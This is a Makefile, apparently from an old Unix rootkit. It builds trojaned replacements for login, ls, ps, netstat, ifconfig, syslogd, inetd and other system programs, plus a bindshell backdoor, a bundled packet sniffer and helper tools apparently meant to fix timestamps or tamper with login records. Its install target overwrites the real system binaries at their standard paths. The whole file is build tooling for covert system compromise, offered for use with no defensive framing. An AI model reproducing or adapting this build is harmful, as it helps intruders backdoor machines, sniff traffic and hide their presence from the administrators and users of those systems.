SUB=inetd login ls du netstat ifconfig ps rshd syslogd
PATHS=/bin/ls /usr/bin/login /bin/ps /usr/libexec/rshd /usr/bin/netstat /sbin/ifconfig /usr/sbin/syslogd /usr/sbin/inetd
FIX=fix
ADLEN=addlen
MARRY=marryv11
BSHELL=bindshell
UTILS=$(FIX) $(ADLEN) $(MARRY) $(BSHELL)
SNIFFIT=sniffit.0.3.5

all: $(UTILS)
	cd $(SNIFFIT); ./configure; make; cd ..
	for i in $(SUB); do cd $$i; make; strip $$i; cd ..; done

$(FIX): $(FIX).o
	$(CC) -o $@ $(FIX).o

$(ADLEN): $(ADLEN).o
	$(CC) -o $@ $(ADLEN).o

$(MARRY): $(MARRY).o
	$(CC) -o $@ $(MARRY).o

$(BSHELL): $(BSHELL).o
	$(CC) -o $@ $(BSHELL).o

install:
	@./install.sh $(PATHS)

clean:
	rm -f $(UTILS) *.o
	cd $(SNIFFIT); make clean; cd ..
	for i in $(SUB); do cd $$i; make clean; cd ..; done

dist:
	@dist.sh $(DISTFILE)
